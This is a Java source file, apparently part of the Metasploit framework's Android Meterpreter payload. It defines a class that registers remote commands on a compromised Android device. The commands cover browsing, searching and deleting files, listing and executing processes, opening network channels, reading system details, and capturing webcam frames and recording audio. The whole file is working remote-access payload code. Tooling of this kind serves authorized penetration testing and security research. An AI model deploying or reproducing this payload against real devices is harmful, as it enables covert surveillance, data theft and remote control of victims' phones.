package com.metasploit.meterpreter;

import java.io.DataInputStream;
import java.io.OutputStream;

import android.content.Context;

import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
import com.metasploit.meterpreter.android.stdapi_sys_process_get_processes_android;
import com.metasploit.meterpreter.android.webcam_audio_record_android;
import com.metasploit.meterpreter.android.webcam_get_frame_android;
import com.metasploit.meterpreter.android.webcam_list_android;
import com.metasploit.meterpreter.android.webcam_start_android;
import com.metasploit.meterpreter.android.webcam_stop_android;
import com.metasploit.meterpreter.stdapi.Loader;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_fs_file;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_tcp_client;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_tcp_server;
import com.metasploit.meterpreter.stdapi.channel_create_stdapi_net_udp_client;
import com.metasploit.meterpreter.stdapi.stdapi_fs_chdir;
import com.metasploit.meterpreter.stdapi.stdapi_fs_delete_dir;
import com.metasploit.meterpreter.stdapi.stdapi_fs_delete_file;
import com.metasploit.meterpreter.stdapi.stdapi_fs_getwd;
import com.metasploit.meterpreter.stdapi.stdapi_fs_ls;
import com.metasploit.meterpreter.stdapi.stdapi_fs_md5;
import com.metasploit.meterpreter.stdapi.stdapi_fs_mkdir;
import com.metasploit.meterpreter.stdapi.stdapi_fs_search;
import com.metasploit.meterpreter.stdapi.stdapi_fs_separator;
import com.metasploit.meterpreter.stdapi.stdapi_fs_sha1;
import com.metasploit.meterpreter.stdapi.stdapi_fs_stat;
import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_interfaces_V1_4;
import com.metasploit.meterpreter.stdapi.stdapi_net_config_get_routes_V1_4;
import com.metasploit.meterpreter.stdapi.stdapi_net_socket_tcp_shutdown_V1_3;
import com.metasploit.meterpreter.stdapi.stdapi_sys_config_getuid;
import com.metasploit.meterpreter.stdapi.stdapi_sys_config_sysinfo;
import com.metasploit.meterpreter.stdapi.stdapi_sys_process_execute_V1_3;

public class AndroidMeterpreter extends Meterpreter {

    private final Context context;

    public Context getContext() {
        return context;
    }

    public AndroidMeterpreter(DataInputStream in, OutputStream rawOut, Context context, boolean redirectErrors) throws Exception {
        super(in, rawOut, true, redirectErrors, false);
        this.context = context;
        startExecuting();
    }

    @Override
    public String[] loadExtension(byte[] data) throws Exception {
        getCommandManager().resetNewCommands();
        CommandManager mgr =  getCommandManager();
        Loader.cwd = context.getFilesDir().getAbsoluteFile();
        mgr.registerCommand("channel_create_stdapi_fs_file", channel_create_stdapi_fs_file.class);
        mgr.registerCommand("channel_create_stdapi_net_tcp_client", channel_create_stdapi_net_tcp_client.class);
        mgr.registerCommand("channel_create_stdapi_net_tcp_server", channel_create_stdapi_net_tcp_server.class);
        mgr.registerCommand("channel_create_stdapi_net_udp_client", channel_create_stdapi_net_udp_client.class);
        mgr.registerCommand("stdapi_fs_chdir", stdapi_fs_chdir.class);
        mgr.registerCommand("stdapi_fs_delete_dir", stdapi_fs_delete_dir.class);
        mgr.registerCommand("stdapi_fs_delete_file", stdapi_fs_delete_file.class);
        mgr.registerCommand("stdapi_fs_file_expand_path", stdapi_fs_file_expand_path_android.class);
        mgr.registerCommand("stdapi_fs_getwd", stdapi_fs_getwd.class);
        mgr.registerCommand("stdapi_fs_ls", stdapi_fs_ls.class);
        mgr.registerCommand("stdapi_fs_mkdir", stdapi_fs_mkdir.class);
        mgr.registerCommand("stdapi_fs_md5", stdapi_fs_md5.class);
        mgr.registerCommand("stdapi_fs_search", stdapi_fs_search.class);
        mgr.registerCommand("stdapi_fs_separator", stdapi_fs_separator.class);
        mgr.registerCommand("stdapi_fs_stat", stdapi_fs_stat.class);
        mgr.registerCommand("stdapi_fs_sha1", stdapi_fs_sha1.class);
        mgr.registerCommand("stdapi_net_config_get_interfaces", stdapi_net_config_get_interfaces_V1_4.class);
        mgr.registerCommand("stdapi_net_config_get_routes", stdapi_net_config_get_routes_V1_4.class);
        mgr.registerCommand("stdapi_net_socket_tcp_shutdown", stdapi_net_socket_tcp_shutdown_V1_3.class);
        mgr.registerCommand("stdapi_sys_config_getuid", stdapi_sys_config_getuid.class);
        mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo.class);
        mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
        mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
        mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
        mgr.registerCommand("webcam_list", webcam_list_android.class);
        mgr.registerCommand("webcam_start", webcam_start_android.class);
        mgr.registerCommand("webcam_stop", webcam_stop_android.class);
        mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
        return getCommandManager().getNewCommands();
    }
}

